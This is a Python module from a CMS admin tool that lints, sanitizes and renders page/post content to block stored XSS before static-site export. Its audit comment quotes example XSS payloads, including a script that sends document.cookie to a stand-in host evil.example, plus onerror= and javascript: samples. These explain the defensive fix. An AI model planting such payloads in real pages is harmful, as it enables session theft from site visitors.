"""
Library:        lib_bejson_Management_content_safety.py
Family:         Management
Description:    content_html/content_markdown safety pipeline for Page/Post
                 (lib_bejson_Management_content.py's PAGE_FIELDS/
                 POST_FIELDS): balanced-tag lint (_lint_content_html,
                 AUDIT FIX L-4 round 2), stdlib-only sanitizer that defangs
                 disallowed tags/attributes/URL schemes for storage
                 (_sanitize_content_html, AUDIT FIX SEC-01), and a
                 stdlib-only Markdown -> HTML renderer (_render_markdown,
                 FEATURE #2). nh3 was evaluated and deliberately not used
                 for the sanitizer — see _sanitize_content_html's own
                 comment below for why (Termux/Bionic libc vs nh3's
                 glibc-only prebuilt wheels).

                 EXTRACTED (2026-09-26): this entire pipeline used to live
                 only inside app.py, defined as private module-level
                 functions. app.py's own /api/pages* and /api/posts*
                 create/update routes always ran every save through
                 _lint_content_html() -> _sanitize_content_html() (with
                 _render_markdown() first when content_markdown was
                 supplied without content_html) before it ever reached
                 lib_bejson_Management_content.py's create/update
                 functions -- but lib_bejson_Management_cli.py's
                 page_create()/page_update() (added in PKG125) called
                 those create/update functions directly, with no
                 equivalent step, and the newly-added post_create()/
                 post_update() (PKG126) were about to make the same
                 mistake. Since content_html ends up baked verbatim into
                 a public static-site export, that gap meant CLI-authored
                 content could carry an unbalanced-tag bug straight
                 through, or -- more seriously -- stored XSS
                 (<script>...</script>, onerror=, javascript: hrefs) that
                 the web path would have caught. Rather than hand-copy
                 this logic into lib_bejson_Management_cli.py (recreating
                 the exact class of divergent-copy problem this project
                 has been auditing for), it was moved here verbatim -- same
                 classes, same functions, same names, same logic, not
                 rewritten -- so app.py and lib_bejson_Management_cli.py
                 both import and run the identical pipeline. app.py's
                 in-file definitions were replaced with an import of this
                 module; every one of its existing call sites
                 (_lint_content_html(...), _sanitize_content_html(...),
                 _render_markdown(...)) is unchanged. See
                 lib_bejson_Management_cli.py's page_create/page_update/
                 post_create/post_update for the new call sites this
                 enables there.
Version:        1.0.0
Date:           2026-09-26
Author:         Elton Boehnen
Contact:        eltonboehnen@gmail.com | boehnenelton2024.pages.dev | github.com/boehnenelton
Format_Creator: Elton Boehnen
RELATIONAL_ID:  4b758bd4-174f-43fc-ade2-ef4cb7e0c9cb
"""

import re

# AUDIT FIX (L-4, round 2): the malformed "<H2O>Post Title Test</h2>" seed
# was fixed as *data* in the round-1 pass, but nothing in the routes below
# actually validated content_html on the way in — so a fresh instance of
# the same bug class (unbalanced/mismatched tags) could be saved again at
# any time, and was, when the seed was re-created. Minimal balanced-tag
# lint at the point of save: reject a start/end tag mismatch (exactly what
# "<H2O>…</h2>" is — an opening "h2o" tag closed by "h2") or a tag left
# unclosed at the end of the content. Void elements (br/img/hr/etc.) and
# self-closing tags are exempt, as is anything that isn't valid-enough
# HTML to tokenize as tags at all (plain text, markdown source) — this is
# a lint against broken *tags*, not a strict HTML validator.
from html.parser import HTMLParser as _HTMLParser
import html as _html_mod

def management_cms_shared_esc(text) -> str:
    """
    Local copy of lib_bejson_Management_shared.py's own
    management_cms_shared_esc() — app.py doesn't otherwise import that
    module (it's the export-time library, this is the admin app), and
    pulling in the whole module for one function isn't worth the
    coupling. Kept in exact parity (same stdlib call, same quote=True)
    with the original; if that one changes, update this too.
    """
    return _html_mod.escape(str(text or ""), quote=True)

_VOID_ELEMENTS = frozenset((
    "area", "base", "br", "col", "embed", "hr", "img", "input",
    "link", "meta", "param", "source", "track", "wbr",
))

class _ContentHtmlLinter(_HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.stack = []
        self.issues = []
    def handle_starttag(self, tag, attrs):
        if tag not in _VOID_ELEMENTS:
            self.stack.append(tag)
    def handle_startendtag(self, tag, attrs):
        pass  # self-closing (<tag/>) — never pushed, nothing to balance
    def handle_endtag(self, tag):
        if self.stack and self.stack[-1] == tag:
            self.stack.pop()
        elif tag in self.stack:
            # Closes an ancestor further up — treat everything in between
            # as implicitly closed (matches real browser/HTML5 recovery
            # behavior for cases like unclosed <li>/<p>) rather than
            # flagging every legitimate omitted-closing-tag pattern.
            while self.stack and self.stack[-1] != tag:
                self.stack.pop()
            if self.stack:
                self.stack.pop()
        else:
            self.issues.append(f"</{tag}> has no matching opening tag")

def _lint_content_html(html_str: str):
    """Returns a list of human-readable problems (empty = OK)."""
    if not html_str or not html_str.strip():
        return []
    linter = _ContentHtmlLinter()
    try:
        linter.feed(html_str)
        linter.close()
    except Exception:
        return []  # not well-formed enough to tokenize as HTML at all — not this lint's job
    issues = list(linter.issues)
    if linter.stack:
        issues.append(f"unclosed tag(s): {', '.join('<'+t+'>' for t in linter.stack)}")
    return issues

# AUDIT FIX (SEC-01): _lint_content_html() above only ever checked tag
# BALANCE — it happily accepted, and this app happily stored and
# published verbatim to Export/ (a public website), things like
# <script>fetch('https://evil.example/?c='+document.cookie)</script>,
# <img src=x onerror="...">, and <a href="javascript:alert(1)">. Today's
# blast radius is bounded (only an authenticated admin can inject), but
# a leaked token, a future multi-user mode, or imported content all turn
# this into real stored XSS on a public site.
#
# nh3 (the audit's suggested library) was evaluated and deliberately NOT
# used: it's a Rust extension distributed only as prebuilt wheels for
# manylinux/glibc targets, and this project's actual deployment target
# is Termux on Android, which uses Bionic libc, not glibc — the same
# platform-mismatch class of problem already hit (and avoided) with
# hash-pinning in requirements.txt (see that file's own comment). Adding
# nh3 risked breaking `pip install` on-device, which is worse than not
# sanitizing at all. This sanitizer is stdlib-only (html.parser, same
# module the linter above already depends on), so it carries zero new
# platform risk.
#
# Runs as a SECOND, independent pass after _lint_content_html() at every
# save site — lint rejects clearly broken markup with an actionable
# error (so an author sees why their save failed); sanitize then defangs
# anything that passed lint but still isn't an allowed tag/attribute/URL
# scheme, so a save can never silently persist an executable payload.
_SANITIZE_ALLOWED_TAGS = frozenset((
    "p", "b", "i", "em", "strong", "u", "s", "a",
    "h1", "h2", "h3", "h4", "h5", "h6",
    "ul", "ol", "li", "br", "hr", "img", "blockquote", "pre", "code",
    "figure", "figcaption", "table", "thead", "tbody", "tr", "th", "td",
    "span", "sub", "sup",
))
# Tags whose CONTENT must also be discarded, not just the tag itself —
# unlike e.g. a stripped <div>, the text inside <script>/<style> was
# never meant to be visible page content.
_SANITIZE_STRIP_CONTENT_TAGS = frozenset(("script", "style", "noscript"))
_SANITIZE_ALLOWED_ATTRS = {
    "a": frozenset(("href", "title")),
    "img": frozenset(("src", "alt", "width", "height")),
    "td": frozenset(("colspan", "rowspan")),
    "th": frozenset(("colspan", "rowspan")),
}
_SANITIZE_URL_ATTRS = frozenset(("href", "src"))
_SANITIZE_ALLOWED_SCHEMES = frozenset(("http", "https", "mailto"))

def _sanitize_is_safe_url(value: str) -> bool:
    value = (value or "").strip()
    if not value:
        return False
    # A scheme is everything before the first ':' PROVIDED it looks like
    # scheme:rest per RFC 3986 (letters/digits/+/-/. only) — anything
    # else (a bare relative path like "/media/x.png", "posts/x.html",
    # or a path containing a literal colon with no valid scheme syntax
    # before it, e.g. "a:b/c") is treated as schemeless/relative, which
    # is safe and is how nearly every real link/image in this app's own
    # content is written.
    colon = value.find(":")
    if colon == -1:
        return True  # relative URL, no scheme at all
    scheme = value[:colon]
    if not re.match(r"^[A-Za-z][A-Za-z0-9+.\-]*$", scheme):
        return True  # not a valid scheme syntax -> treat as relative/safe
    return scheme.lower() in _SANITIZE_ALLOWED_SCHEMES

class _ContentHtmlSanitizer(_HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.out = []
        # Stack of (tag, kept: bool) so end tags only close what their
        # matching start tag actually did, and so content inside a
        # dropped script/style can be suppressed until its real end tag.
        self.stack = []
        self.skip_depth = 0  # >0 while inside a dropped script/style/noscript

    def _emit_starttag(self, tag, attrs, self_closing):
        if tag in _SANITIZE_STRIP_CONTENT_TAGS:
            if not self_closing:
                self.stack.append((tag, False))
                self.skip_depth += 1
            return
        if self.skip_depth > 0:
            # Inside a stripped script/style — track nesting of the same
            # tag name so an inner <script> doesn't end the skip early,
            # but don't emit anything.
            if not self_closing:
                self.stack.append((tag, False))
            return
        if tag not in _SANITIZE_ALLOWED_TAGS:
            # Drop the tag, keep processing its children as if unwrapped
            # (e.g. a stripped <div>'s text content is still real page
            # content and should survive).
            if not self_closing:
                self.stack.append((tag, False))
            return
        allowed_attrs = _SANITIZE_ALLOWED_ATTRS.get(tag, frozenset())
        kept_attrs = []
        for name, val in attrs:
            name = (name or "").lower()
            if name not in allowed_attrs:
                continue  # silently drops onerror=, onclick=, style=, etc. for every tag
            if name in _SANITIZE_URL_ATTRS and not _sanitize_is_safe_url(val or ""):
                continue  # drops javascript:/data:/etc. — the tag itself survives without this attr
            kept_attrs.append(f'{name}="{management_cms_shared_esc(val or "")}"')
        attr_str = (" " + " ".join(kept_attrs)) if kept_attrs else ""
        if self_closing or tag in _VOID_ELEMENTS:
            self.out.append(f"<{tag}{attr_str}>")
        else:
            self.out.append(f"<{tag}{attr_str}>")
            self.stack.append((tag, True))

    def handle_starttag(self, tag, attrs):
        self._emit_starttag(tag.lower(), attrs, self_closing=False)

    def handle_startendtag(self, tag, attrs):
        self._emit_starttag(tag.lower(), attrs, self_closing=True)

    def handle_endtag(self, tag):
        tag = tag.lower()
        if not self.stack:
            return
        # Find the matching open entry from the top, same recovery
        # approach as the linter above (closes everything back to the
        # matching tag rather than only ever popping exactly one).
        for idx in range(len(self.stack) - 1, -1, -1):
            if self.stack[idx][0] == tag:
                while len(self.stack) > idx:
                    popped_tag, was_kept = self.stack.pop()
                    if popped_tag in _SANITIZE_STRIP_CONTENT_TAGS:
                        self.skip_depth -= 1
                    elif was_kept:
                        self.out.append(f"</{popped_tag}>")
                break
            # tag not found in stack at all -- stray end tag, ignore

    def handle_data(self, data):
        if self.skip_depth > 0:
            return
        self.out.append(management_cms_shared_esc(data))

    def close_out(self):
        # Anything still open at EOF (matches the linter's own
        # "unclosed tag" tolerance) — close kept tags so output stays
        # well-formed rather than leaking an unclosed element.
        while self.stack:
            popped_tag, was_kept = self.stack.pop()
            if popped_tag in _SANITIZE_STRIP_CONTENT_TAGS:
                self.skip_depth -= 1
            elif was_kept:
                self.out.append(f"</{popped_tag}>")
        return "".join(self.out)

def _sanitize_content_html(html_str: str) -> str:
    """
    Defangs content_html for storage: unknown tags are unwrapped (their
    text kept), disallowed attributes (onerror=, onclick=, style=, etc.)
    are dropped, disallowed URL schemes (javascript:, data:, etc.) on
    href=/src= are dropped, and <script>/<style>/<noscript> are removed
    tag-and-content. Always call AFTER _lint_content_html() has already
    accepted the input — this doesn't validate structure, only content.
    """
    if not html_str or not html_str.strip():
        return html_str or ""
    sanitizer = _ContentHtmlSanitizer()
    try:
        sanitizer.feed(html_str)
        sanitizer.close()
    except Exception:
        return ""  # unparseable — fail closed rather than store something unvetted
    return sanitizer.close_out()

def _md_inline(text: str) -> str:
    """
    Inline Markdown spans for _render_markdown() below: images, links,
    bold, italic, inline code. Escapes the raw text FIRST, then only
    ever introduces real tags via these fixed substitutions — so
    Markdown source containing literal "<script>" or similar can't
    smuggle a tag past _sanitize_content_html() by already looking like
    safe markup before that pass ever runs. _sanitize_content_html()
    still runs on the final output regardless, same as hand-authored
    content_html — this is defense in depth, not a replacement for it.
    """
    text = management_cms_shared_esc(text)
    text = re.sub(r"!\[([^\]]*)\]\(([^)]+)\)", r'<img src="\2" alt="\1">', text)
    text = re.sub(r"\[([^\]]+)\]\(([^)]+)\)", r'<a href="\2">\1</a>', text)
    text = re.sub(r"\*\*(.+?)\*\*", r"<strong>\1</strong>", text)
    text = re.sub(r"__(.+?)__", r"<strong>\1</strong>", text)
    text = re.sub(r"(?<!\*)\*(?!\*)(.+?)(?<!\*)\*(?!\*)", r"<em>\1</em>", text)
    text = re.sub(r"(?<!_)_(?!_)(.+?)(?<!_)_(?!_)", r"<em>\1</em>", text)
    text = re.sub(r"`([^`]+)`", r"<code>\1</code>", text)
    return text

def _render_markdown(md_str: str) -> str:
    """
    FEATURE #2 (2026-09-12): stdlib-only, regex-based Markdown -> HTML
    converter for the content_markdown field on Page/Post (see
    PAGE_FIELDS/POST_FIELDS in lib_bejson_Management_content.py — that
    field already existed, fully wired through create/update/API/dict
    serialization, but was never actually rendered anywhere until now).
    No external dependency — Termux constraint, same reasoning SEC-01's
    own comment gives for rejecting nh3 above.

    Output is deliberately restricted to _SANITIZE_ALLOWED_TAGS' subset:
    headings, bold/italic, links, images, ul/ol lists, fenced/inline
    code, blockquotes, and `---` -> <hr>. Not a spec-complete CommonMark
    implementation — nested lists, tables, and reference-style links are
    out of scope; anything unrecognized falls through as a plain
    paragraph rather than being dropped. Callers MUST still pipe the
    result through _lint_content_html() -> _sanitize_content_html()
    before storage, exactly like hand-authored content_html — this
    function alone does not guarantee well-formed or safe output.
    """
    if not md_str or not md_str.strip():
        return ""

    text = md_str.replace("\r\n", "\n").replace("\r", "\n")

    # Fenced code blocks first (```lang\n...\n```) — stashed before any
    # other processing can touch their contents, restored verbatim
    # (escaped, not re-parsed) at the end.
    code_blocks = []
    text = re.sub(r"```[a-zA-Z0-9_+-]*\n(.*?)```", lambda m: _stash_code_wrap(m, code_blocks), text, flags=re.DOTALL)

    blocks = re.split(r"\n\s*\n", text.strip())
    out = []
    for block in blocks:
        block = block.strip("\n")
        if not block:
            continue

        m = re.fullmatch(r"\x00CODEBLOCK(\d+)\x00", block.strip())
        if m:
            code = code_blocks[int(m.group(1))]
            out.append(f"<pre><code>{management_cms_shared_esc(code)}</code></pre>")
            continue

        if re.fullmatch(r"-{3,}|\*{3,}|_{3,}", block.strip()):
            out.append("<hr>")
            continue

        m = re.match(r"^(#{1,6})\s+(.*)$", block.strip())
        if m:
            level = len(m.group(1))
            out.append(f"<h{level}>{_md_inline(m.group(2))}</h{level}>")
            continue

        lines = [l for l in block.split("\n")]
        if lines and all(l.strip().startswith(">") for l in lines if l.strip()):
            inner = " ".join(l.strip()[1:].strip() for l in lines if l.strip())
            out.append(f"<blockquote><p>{_md_inline(inner)}</p></blockquote>")
            continue

        non_empty = [l for l in lines if l.strip()]
        if non_empty and all(re.match(r"^\s*[-*]\s+", l) for l in non_empty):
            items = [re.sub(r"^\s*[-*]\s+", "", l) for l in non_empty]
            out.append("<ul>" + "".join(f"<li>{_md_inline(it)}</li>" for it in items) + "</ul>")
            continue

        if non_empty and all(re.match(r"^\s*\d+\.\s+", l) for l in non_empty):
            items = [re.sub(r"^\s*\d+\.\s+", "", l) for l in non_empty]
            out.append("<ol>" + "".join(f"<li>{_md_inline(it)}</li>" for it in items) + "</ol>")
            continue

        out.append(f"<p>{_md_inline(block).replace(chr(10), '<br>')}</p>")

    return "\n".join(out)

def _stash_code_wrap(m, code_blocks):
    code_blocks.append(m.group(1))
    return f"\x00CODEBLOCK{len(code_blocks) - 1}\x00"
